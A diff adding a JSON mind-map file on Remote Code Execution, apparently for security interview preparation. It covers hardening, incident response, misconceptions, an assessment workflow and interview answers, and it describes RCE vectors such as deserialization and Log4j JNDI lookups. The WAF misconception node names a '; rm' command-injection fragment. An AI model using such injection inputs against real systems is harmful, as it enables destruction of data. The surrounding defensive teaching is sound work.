+              "expanded": false
+            }
+          ],
+          "blurb": "subprocess: list argv, shell=False, fixed binary path - No eval on untrusted...",
+          "expanded": false
+        },
+        {
+          "id": "n3ff5b5eae433203",
+          "title": "Containment (IR)",
+          "markdown": "Contain -> patch/redeploy -> **rotate secrets** -> hunt persistence -> improve detection",
+          "notes": "Contain -> patch/redeploy -> rotate secrets -> hunt persistence -> improve detection",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Contain -> patch/redeploy -> rotate secrets -> hunt persistence -> improve...",
+          "expanded": false
+        },
+        {
+          "id": "n29366f07e0a450b",
+          "title": "Runtime hardening",
+          "markdown": "Non-root \u00b7 read-only rootfs \u00b7 seccomp/AppArmor \u00b7 **default-deny egress** \u00b7 minimal image",
+          "notes": "Non-root \u00b7 read-only rootfs \u00b7 seccomp/AppArmor \u00b7 default-deny egress \u00b7 minimal image",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Non-root \u00b7 read-only rootfs \u00b7 seccomp/AppArmor \u00b7 default-deny egress \u00b7...",
+          "expanded": false
+        },
+        {
+          "id": "n7a755bb8aaea8dd",
+          "title": "Tools",
+          "markdown": "Semgrep \u00b7 CodeQL \u00b7 Bandit \u00b7 OSV/Dependabot \u00b7 Falco",
+          "notes": "Semgrep \u00b7 CodeQL \u00b7 Bandit \u00b7 OSV/Dependabot \u00b7 Falco",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Semgrep \u00b7 CodeQL \u00b7 Bandit \u00b7 OSV/Dependabot \u00b7 Falco",
+          "expanded": false
+        },
+        {
+          "id": "n35afbabf644c64c",
+          "title": "Cross-read",
+          "markdown": "`Insecure Deserialization` \u00b7 `SSTI` \u00b7 `File Upload` \u00b7 `Supply Chain` \u00b7 `Container Security`",
+          "notes": "Insecure Deserialization \u00b7 SSTI \u00b7 File Upload \u00b7 Supply Chain \u00b7 Container Security",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Insecure Deserialization \u00b7 SSTI \u00b7 File Upload \u00b7 Supply Chain \u00b7 Container...",
+          "expanded": false
+        },
+        {
+          "id": "n6419434315ce9b8",
+          "title": "30-second pitch",
+          "markdown": "\"RCE = code runs on our box-injection, deserialization, templates, or CVEs; fix with **safe APIs**, **no shell**, **patching**, **deserialization policy**, and **container** **least privilege**; assume breach and **rotate** secrets.\"",
+          "notes": "\"RCE = code runs on our box-injection, deserialization, templates, or CVEs; fix with safe APIs, no shell, patching, deserialization policy, and container least privilege; assume breach and rotate secrets.\"",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "\"RCE = code runs on our box-injection, deserialization, templates, or CVEs;...",
+          "expanded": false
+        }
+      ],
+      "blurb": "Attacker causes your server/worker to run attacker-controlled code or OS..."
+    },
+    {
+      "id": "n279ae8bcab5e257",
+      "title": "Misconceptions",
+      "markdown": "",
+      "notes": "",
+      "expanded": false,
+      "kind": "group",
+      "children": [
+        {
+          "id": "n74861c6dc0268bc",
+          "title": "\"RCE always means root on the box.\"",
+          "markdown": "**Reality:** You get **whatever the process user** can do-often **app** or **`www-data`**. **Container** + **non-root** + **read-only** FS **limits** but does not make RCE \"low.\" Attackers still **exfil** secrets, hit **metadata**, or **pivot**.",
+          "notes": "Reality: You get whatever the process user can do-often app or www-data. Container + non-root + read-only FS limits but does not make RCE \"low.\" Attackers still exfil secrets, hit metadata, or pivot.",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Reality: You get whatever the process user can do-often app or www-data.",
+          "expanded": false
+        },
+        {
+          "id": "nd10d003111ba161",
+          "title": "\"WAF blocks RCE.\"",
+          "markdown": "**Reality:** WAF may catch **obvious** **`; rm`** payloads; it **won't** stop **deserialization gadgets**, **file-format** bugs, or **encrypted** traffic to **legit** endpoints. **Code and dependency** fixes are primary.",
+          "notes": "Reality: WAF may catch obvious ; rm payloads; it won't stop deserialization gadgets, file-format bugs, or encrypted traffic to legit endpoints. Code and dependency fixes are primary.",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Reality: WAF may catch obvious ; rm payloads; it won't stop deserialization...",
+          "expanded": false
+        },
+        {
+          "id": "n1a006411c5a26ca",
+          "title": "\"We don\u2019t use eval, so no RCE.\"",
+          "markdown": "**Reality:** **`pickle`**, **`yaml.load`**, **template engines**, **`ObjectInputStream`**, **ImageMagick delegates**, **OGNL/SpEL**-none need `eval` in **your** source.",
+          "notes": "Reality: pickle, yaml.load, template engines, ObjectInputStream, ImageMagick delegates, OGNL/SpEL-none need eval in your source.",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Reality: pickle, yaml.load, template engines, ObjectInputStream, ImageMagick...",
+          "expanded": false
+        },
+        {
+          "id": "n87afe449ed2545d",
+          "title": "\"Patching the library closes the incident.\"",
+          "markdown": "**Reality:** **Assume breach**: **rotate** credentials the process could read, **scan** for **webshells** and **cron**, **review** **egress** logs, **verify** **backup** integrity.",
+          "notes": "Reality: Assume breach: rotate credentials the process could read, scan for webshells and cron, review egress logs, verify backup integrity.",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Reality: Assume breach: rotate credentials the process could read, scan for...",
+          "expanded": false
+        },
+        {
+          "id": "n8312501e9c5b597",
+          "title": "\"Containers make RCE safe.\"",
+          "markdown": "**Reality:** Containers **shrink** blast radius vs bare metal but **share** kernel; **misconfigured** **`cap_sys_admin`**, **socket** mounts, or **weak** **network policies** still allow **serious** harm.",
+          "notes": "Reality: Containers shrink blast radius vs bare metal but share kernel; misconfigured capsysadmin, socket mounts, or weak network policies still allow serious harm.",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Reality: Containers shrink blast radius vs bare metal but share kernel;...",
+          "expanded": false
+        },
+        {
+          "id": "nb1f874ee1584287",
+          "title": "\"Only internet-facing apps matter.\"",
+          "markdown": "**Reality:** **Internal** services often hold **more** trust and **weaker** auth-**SSRF** or **compromised** laptop can reach them. **Zero trust** assumes **RCE** anywhere is possible.",
+          "notes": "Reality: Internal services often hold more trust and weaker auth-SSRF or compromised laptop can reach them. Zero trust assumes RCE anywhere is possible.",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Reality: Internal services often hold more trust and weaker auth-SSRF or...",
+          "expanded": false
+        },
+        {
+          "id": "n549ed9aaaa44634",
+          "title": "\"Static scan clean == no RCE.\"",
+          "markdown": "**Reality:** **TPL** / **config** / **runtime** plugins and **dynamic** code paths evade **SAST**; **DAST** + **dependency** + **manual** review still required.",
+          "notes": "Reality: TPL / config / runtime plugins and dynamic code paths evade SAST; DAST + dependency + manual review still required.",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Reality: TPL / config / runtime plugins and dynamic code paths evade SAST;...",
+          "expanded": false
+        },
+        {
+          "id": "nd67de1beee46484",
+          "title": "\"Severity is always Critical 10/10.\"",
+          "markdown": "**Reality:** **CVSS** context: **scope**, **privileges**, **exploitability**, **data** at risk. Still usually **top** of backlog-but **communicate** **nuance** to leadership.",
+          "notes": "Reality: CVSS context: scope, privileges, exploitability, data at risk. Still usually top of backlog-but communicate nuance to leadership.",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Reality: CVSS context: scope, privileges, exploitability, data at risk.",
+          "expanded": false
+        },
+        {
+          "id": "n27d8e4c00a20168",
+          "title": "Consolidated note",
+          "markdown": "Older generic \"interview tips only\" bullets are **superseded** by topic-specific content above; mechanism + **IR** + **supply chain** win interviews.",
+          "notes": "Older generic \"interview tips only\" bullets are superseded by topic-specific content above; mechanism + IR + supply chain win interviews.",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Older generic \"interview tips only\" bullets are superseded by topic-specific...",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes \"RCE always means root on the box.\""
+    },
+    {
+      "id": "n1273b128fd2bbe4",
+      "title": "How to test",
+      "markdown": "",
+      "notes": "",
+      "expanded": false,
+      "kind": "group",
+      "children": [
+        {
+          "id": "n6b53554eb95b120",
+          "title": "Objective",
+          "markdown": "Create a repeatable assessment workflow for `Remote Code Execution (RCE)` that produces reproducible evidence and actionable remediation guidance.",
+          "notes": "Create a repeatable assessment workflow for Remote Code Execution (RCE) that produces reproducible evidence and actionable remediation guidance.",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Create a repeatable assessment workflow for Remote Code Execution (RCE) that...",
+          "expanded": false
+        },
+        {
+          "id": "na5aa37327f3a937",
+          "title": "Phase 1 - Scope and preparation",
+          "markdown": "Confirm in-scope assets, test windows, and prohibited actions.",
+          "notes": "Confirm in-scope assets, test windows, and prohibited actions.",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "n13a1532a4585e68",
+              "title": "Confirm in-scope assets, test windows, and prohibited actions.",
+              "markdown": "- Confirm in-scope assets, test windows, and prohibited actions.",
+              "notes": "Confirm in-scope assets, test windows, and prohibited actions.",
+              "blurb": "Confirm in-scope assets, test windows, and prohibited actions.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "nf24e1f7df2440f1",
+              "title": "Identify critical user journeys and trust boundaries.",
+              "markdown": "- Identify critical user journeys and trust boundaries.",
+              "notes": "Identify critical user journeys and trust boundaries.",
+              "blurb": "Identify critical user journeys and trust boundaries.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "nce820b4e8ac406e",
+              "title": "Define severity rubric and evidence requirements before testing.",
+              "markdown": "- Define severity rubric and evidence requirements before testing.",
+              "notes": "Define severity rubric and evidence requirements before testing.",
+              "blurb": "Define severity rubric and evidence requirements before testing.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            }
+          ],
+          "blurb": "Confirm in-scope assets, test windows, and prohibited actions.",
+          "expanded": false
+        },
+        {
+          "id": "n24747d1cee8ba56",
+          "title": "Phase 2 - Recon and attack-surface mapping",
+          "markdown": "Enumerate relevant endpoints, flows, and data paths.",
+          "notes": "Enumerate relevant endpoints, flows, and data paths.",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "n3b24b201cbd4346",
+              "title": "Enumerate relevant endpoints, flows, and data paths.",
+              "markdown": "- Enumerate relevant endpoints, flows, and data paths.",
+              "notes": "Enumerate relevant endpoints, flows, and data paths.",
+              "blurb": "Enumerate relevant endpoints, flows, and data paths.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "nb66394c12b97316",
+              "title": "Document where security checks are expected to happen.",
+              "markdown": "- Document where security checks are expected to happen.",
+              "notes": "Document where security checks are expected to happen.",
+              "blurb": "Document where security checks are expected to happen.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n192a8bc09927942",
+              "title": "Mark high-value assets and high-impact paths.",
+              "markdown": "- Mark high-value assets and high-impact paths.",
+              "notes": "Mark high-value assets and high-impact paths.",
+              "blurb": "Mark high-value assets and high-impact paths.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            }
+          ],
+          "blurb": "Enumerate relevant endpoints, flows, and data paths.",
+          "expanded": false
+        },
+        {
+          "id": "n0d44abb6e30e1cb",
+          "title": "Phase 3 - Hypothesis-driven testing",
+          "markdown": "Start with low-risk probes and baseline behavior.",
+          "notes": "Start with low-risk probes and baseline behavior.",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "na01cec9630e9139",
+              "title": "Start with low-risk probes and baseline behavior.",
+              "markdown": "- Start with low-risk probes and baseline behavior.",
+              "notes": "Start with low-risk probes and baseline behavior.",
+              "blurb": "Start with low-risk probes and baseline behavior.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n93fb2a2ee4af4e6",
+              "title": "Test failure hypotheses systematically (one variable at a time).",
+              "markdown": "- Test failure hypotheses systematically (one variable at a time).",
+              "notes": "Test failure hypotheses systematically (one variable at a time).",
+              "blurb": "Test failure hypotheses systematically (one variable at a time).",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n5474521eab3db4e",
+              "title": "Capture request/response artifacts for each finding candidate.",
+              "markdown": "- Capture request/response artifacts for each finding candidate.",
+              "notes": "Capture request/response artifacts for each finding candidate.",
+              "blurb": "Capture request/response artifacts for each finding candidate.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            }
+          ],
+          "blurb": "Start with low-risk probes and baseline behavior.",
+          "expanded": false
+        },
+        {
+          "id": "nfa4623337906e4b",
+          "title": "Phase 4 - Validation and impact proof",
+          "markdown": "Reproduce findings with clean-state retests.",
+          "notes": "Reproduce findings with clean-state retests.",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "nb31aae79e89eebc",
+              "title": "Reproduce findings with clean-state retests.",
+              "markdown": "- Reproduce findings with clean-state retests.",
+              "notes": "Reproduce findings with clean-state retests.",
+              "blurb": "Reproduce findings with clean-state retests.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n2c6943517236242",
+              "title": "Confirm exploitability and practical impact.",
+              "markdown": "- Confirm exploitability and practical impact.",
+              "notes": "Confirm exploitability and practical impact.",
+              "blurb": "Confirm exploitability and practical impact.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "nbd8b73526213b60",
+              "title": "Eliminate false positives; record confidence level.",
+              "markdown": "- Eliminate false positives; record confidence level.",
+              "notes": "Eliminate false positives; record confidence level.",
+              "blurb": "Eliminate false positives; record confidence level.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            }
+          ],
+          "blurb": "Reproduce findings with clean-state retests.",
+          "expanded": false
+        },
+        {
+          "id": "n7f5c4111e10977d",
+          "title": "Phase 5 - Remediation and verification",
+          "markdown": "Provide immediate containment + structural fix recommendations.",
+          "notes": "Provide immediate containment + structural fix recommendations.",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "ndfe7696e947d0a7",
+              "title": "Provide immediate containment + structural fix recommendations.",
+              "markdown": "- Provide immediate containment + structural fix recommendations.",
+              "notes": "Provide immediate containment + structural fix recommendations.",
+              "blurb": "Provide immediate containment + structural fix recommendations.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n855e8d21e2a4ddf",
+              "title": "Define post-fix verification tests and telemetry checks.",
+              "markdown": "- Define post-fix verification tests and telemetry checks.",
+              "notes": "Define post-fix verification tests and telemetry checks.",
+              "blurb": "Define post-fix verification tests and telemetry checks.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n4a453948520231b",
+              "title": "Re-test after remediation and close with evidence.",
+              "markdown": "- Re-test after remediation and close with evidence.",
+              "notes": "Re-test after remediation and close with evidence.",
+              "blurb": "Re-test after remediation and close with evidence.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            }
+          ],
+          "blurb": "Provide immediate containment + structural fix recommendations.",
+          "expanded": false
+        },
+        {
+          "id": "nd59ae19abd1788d",
+          "title": "Evidence template",
+          "markdown": "Asset / endpoint: - Preconditions: - Reproduction steps: - Observed behavior: - Security impact: - Business impact: - Recommended fix: - Verification result:",
+          "notes": "Asset / endpoint: - Preconditions: - Reproduction steps: - Observed behavior: - Security impact: - Business impact: - Recommended fix: - Verification result:",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "n967b6545cd23830",
+              "title": "Asset / endpoint",
+              "markdown": "- Asset / endpoint",
+              "notes": "Asset / endpoint",
+              "blurb": "",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n993f1f58f57cd74",
+              "title": "Preconditions",
+              "markdown": "- Preconditions",
+              "notes": "Preconditions",
+              "blurb": "",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n683da9eb6035bf4",
+              "title": "Reproduction steps",
+              "markdown": "- Reproduction steps",
+              "notes": "Reproduction steps",
+              "blurb": "Reproduction steps",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n050d8ca483f9d22",
+              "title": "Observed behavior",
+              "markdown": "- Observed behavior",
+              "notes": "Observed behavior",
+              "blurb": "",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n79ab319d303970a",
+              "title": "Security impact",
+              "markdown": "- Security impact",
+              "notes": "Security impact",
+              "blurb": "",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n0b9526d659e15c6",
+              "title": "Business impact",
+              "markdown": "- Business impact",
+              "notes": "Business impact",
+              "blurb": "",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "ne20a7ca1c442d68",
+              "title": "Recommended fix",
+              "markdown": "- Recommended fix",
+              "notes": "Recommended fix",
+              "blurb": "",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n38d1bb35ad27f14",
+              "title": "Verification result",
+              "markdown": "- Verification result",
+              "notes": "Verification result",
+              "blurb": "Verification result",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            }
+          ],
+          "blurb": "Asset / endpoint: - Preconditions: - Reproduction steps: - Observed...",
+          "expanded": false
+        },
+        {
+          "id": "nf3617442f235af7",
+          "title": "Interview drill",
+          "markdown": "In 3 minutes, explain how you would run this VAPT workflow for one production-like service and what evidence you need before escalating severity.",
+          "notes": "In 3 minutes, explain how you would run this VAPT workflow for one production-like service and what evidence you need before escalating severity.",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "In 3 minutes, explain how you would run this VAPT workflow for one...",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes Objective"
+    },
+    {
+      "id": "n5523999c5e456eb",
+      "title": "Interview prompts",
+      "markdown": "",
+      "notes": "",
+      "expanded": false,
+      "kind": "group",
+      "children": [
+        {
+          "id": "n836b40ac12518fe",
+          "title": "60-second answer",
+          "markdown": "**Q: What is RCE and why is it critical?**\n\n**A:** Remote code execution means an attacker can get **arbitrary code or commands** to run on a server or worker you operate-via **command injection**, **unsafe deserialization**, **template engines**, **dependency CVEs** like **Log4j**, or **upload + execute** chains. It is critical because it often **bypasses application logic**, allows **data theft**, **lateral movement**, and **persistence**, and usually forces **incident response**, **patching**, and **secret rotation**. Defense is **safe APIs** (no shell), **input separation**, **patch discipline**, **deserialization hygiene**, and **runtime containment** (non-root, read-only FS, egress controls).",
+          "notes": "Q: What is RCE and why is it critical?\n\nA: Remote code execution means an attacker can get arbitrary code or commands to run on a server or worker you operate-via command injection, unsafe deserialization, template engines, dependency CVEs like Log4j, or upload + execute chains. It is critical because it often bypasses application logic, allows data theft, lateral movement, and persistence, and usually forces incident response, patching, and secret rotation. Defense is safe APIs (no shell), input separation, patch discipline, deserialization hygiene, and runtime containment (non-root, read-only FS, egress controls).",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "Q: What is RCE and why is it critical?",
+          "expanded": false
+        },
+        {
+          "id": "n4c6a9407b49f83b",
+          "title": "Taxonomy",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "n044298377a530f0",
+              "title": "Q: Name four different technical causes of RCE.",
+              "markdown": "**A:** (1) **OS command injection** (shell metacharacters). (2) **Unsafe deserialization / object injection**. (3) **Server-side template injection** escaping the sandbox. (4) **Known library flaws** (e.g. **JNDI** lookup chains) or **expression language** injection. (Bonus: **memory corruption** in native code.)",
+              "notes": "A: (1) OS command injection (shell metacharacters). (2) Unsafe deserialization / object injection. (3) Server-side template injection escaping the sandbox. (4) Known library flaws (e.g. JNDI lookup chains) or expression language injection. (Bonus: memory corruption in native code.)",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "blurb": "A: (1) OS command injection (shell metacharacters).",
+              "expanded": false
+            },
+            {
+              "id": "nb54a775c43f659f",
+              "title": "Q: RCE vs arbitrary file read vs SSRF?",
+              "markdown": "**A:** **RCE** is **code execution**. **File read** discloses data; may **chain** to RCE via **LFI** + upload. **SSRF** abuses **outbound** requests; may **chain** to cloud metadata or **internal** exploit-**not** RCE by itself unless combined.",
+              "notes": "A: RCE is code execution. File read discloses data; may chain to RCE via LFI + upload. SSRF abuses outbound requests; may chain to cloud metadata or internal exploit-not RCE by itself unless combined.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "blurb": "A: RCE is code execution.",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes Q: Name four different technical causes of RCE.",
+          "expanded": false
+        },
+        {
+          "id": "n2a8af94db124b5c",
+          "title": "Defense engineering",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "nf29b1f8913c499f",
+              "title": "Q: How do you call ImageMagick or ffmpeg safely from a web app?",
+              "markdown": "**A:** **No** string shell; **allowlisted** arguments; **separate** worker with **no** network; **latest** patched binaries; **resource** limits; consider **re-encoding** in **isolated** **queue**; validate **file type** before tools run.",
+              "notes": "A: No string shell; allowlisted arguments; separate worker with no network; latest patched binaries; resource limits; consider re-encoding in isolated queue; validate file type before tools run.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "blurb": "A: No string shell; allowlisted arguments; separate worker with no network;...",
+              "expanded": false
+            },
+            {
+              "id": "n57794e70d0657af",
+              "title": "Q: How do you defend against deserialization RCE in Java?",
+              "markdown": "**A:** Avoid **ObjectInputStream** on **untrusted** bytes; use **signed** formats; **JSON** + validated DTOs; **global** **denylist**/allowlist where framework supports; **patch** **gadget** libraries; **monitor** **unexpected** classes loaded.",
+              "notes": "A: Avoid ObjectInputStream on untrusted bytes; use signed formats; JSON + validated DTOs; global denylist/allowlist where framework supports; patch gadget libraries; monitor unexpected classes loaded.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "blurb": "A: Avoid ObjectInputStream on untrusted bytes; use signed formats; JSON +...",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes Q: How do you call ImageMagick or ffmpeg safely from a web app?",
+          "expanded": false
+        },
+        {
+          "id": "n198b3a0c0fc0a0c",
+          "title": "Incident response",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "n521f3b6083f25d9",
+              "title": "Q: First three actions when RCE is confirmed in prod?",
+              "markdown": "**A:** (1) **Contain**: block IOCs, **isolate** instances, **preserve** evidence if needed. (2) **Patch** or **remove** vulnerable code path; **scale** to **clean** images. (3) **Rotate** **secrets** the process could read; **hunt** **persistence** and **lateral** movement.",
+              "notes": "A: (1) Contain: block IOCs, isolate instances, preserve evidence if needed. (2) Patch or remove vulnerable code path; scale to clean images. (3) Rotate secrets the process could read; hunt persistence and lateral movement.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "blurb": "A: (1) Contain: block IOCs, isolate instances, preserve evidence if needed.",
+              "expanded": false
+            },
+            {
+              "id": "nc4337db0dc4f23d",
+              "title": "Q: How do you prioritize \u201cauth bypass\u201d vs \u201cRCE\u201d?",
+              "markdown": "**A:** **RCE** usually **wins** on urgency because **blast radius** and **trust** collapse-but **auth bypass** on **admin** can be **equal**. Use **exploitability**, **exposure**, **data** sensitivity, and **existing** **controls**.",
+              "notes": "A: RCE usually wins on urgency because blast radius and trust collapse-but auth bypass on admin can be equal. Use exploitability, exposure, data sensitivity, and existing controls.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "blurb": "A: RCE usually wins on urgency because blast radius and trust collapse-but...",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes Q: First three actions when RCE is confirmed in prod?",
+          "expanded": false
+        },
+        {
+          "id": "n4df4c30f82aa206",
+          "title": "Supply chain",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "ne2004f0d6043c2f",
+              "title": "Q: Log4j in three sentences.",
+              "markdown": "**A:** Attacker places **JNDI** string in logged input; vulnerable **Log4j** performs **lookup**; attacker serves **malicious** class -> **code runs** in app JVM. **Fix:** upgrade Log4j, **disable** message lookups, **restrict egress**, **hunt** **IOC**s.",
+              "notes": "A: Attacker places JNDI string in logged input; vulnerable Log4j performs lookup; attacker serves malicious class -> code runs in app JVM. Fix: upgrade Log4j, disable message lookups, restrict egress, hunt IOCs.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "blurb": "A: Attacker places JNDI string in logged input; vulnerable Log4j performs...",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes Q: Log4j in three sentences.",
+          "expanded": false
+        },
+        {
+          "id": "n3e7d220c3c22988",
+          "title": "Depth: Interview follow-ups",
+          "markdown": "When is eval ever acceptable?",
+          "notes": "When is eval ever acceptable?",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "n06354d64c75aab1",
+              "title": "When is eval ever acceptable?",
+              "markdown": "- When is eval ever acceptable?",
+              "notes": "When is eval ever acceptable?",
+              "blurb": "When is eval ever acceptable?",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "nc53d068bdaf328c",
+              "title": "How does container non-root help after RCE?",
+              "markdown": "- How does container non-root help after RCE?",
+              "notes": "How does container non-root help after RCE?",
+              "blurb": "How does container non-root help after RCE?",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n1613cfa5303d81c",
+              "title": "Falco rule examples for shell from java.",
+              "markdown": "- Falco rule examples for shell from java.",
+              "notes": "Falco rule examples for shell from java.",
+              "blurb": "Falco rule examples for shell from java.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "necb3c952f599355",
+              "title": "Semgrep vs CodeQL for finding injection sinks.",
+              "markdown": "- Semgrep vs CodeQL for finding injection sinks.",
+              "notes": "Semgrep vs CodeQL for finding injection sinks.",
+              "blurb": "Semgrep vs CodeQL for finding injection sinks.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            }
+          ],
+          "blurb": "When is eval ever acceptable?",
+          "expanded": false
+        },
+        {
+          "id": "ne3ca7ffb532aafe",
+          "title": "Mock ladder",
+          "markdown": "| Level | Question |\n|-------|----------|\n| Junior | Define RCE; one **example** vector. |\n| Mid | Safe **subprocess** pattern in **your** language. |\n| Senior | **Defense in depth** for **dependency** RCE class. |\n| Staff | **Enterprise** program: **prevent** repeat **Log4j**-style events. |\n\n**Target:** 7-8/8 on accuracy, depth, practicality, verification.",
+          "notes": "| Level | Question |\n|-------|----------|\n| Junior | Define RCE; one example vector. |\n| Mid | Safe subprocess pattern in your language. |\n| Senior | Defense in depth for dependency RCE class. |\n| Staff | Enterprise program: prevent repeat Log4j-style events. |\n\nTarget: 7-8/8 on accuracy, depth, practicality, verification.",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "| Level | Question | |-------|----------| | Junior | Define RCE; one example...",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes 60-second answer"
+    }
+  ],
+  "topicId": "remote-code-execution-rce",
+  "name": "Remote Code Execution (RCE)",
+  "structure": "logic-right",
+  "blurb": "Remote code execution (RCE) means an attacker can cause your system to run..."
+}
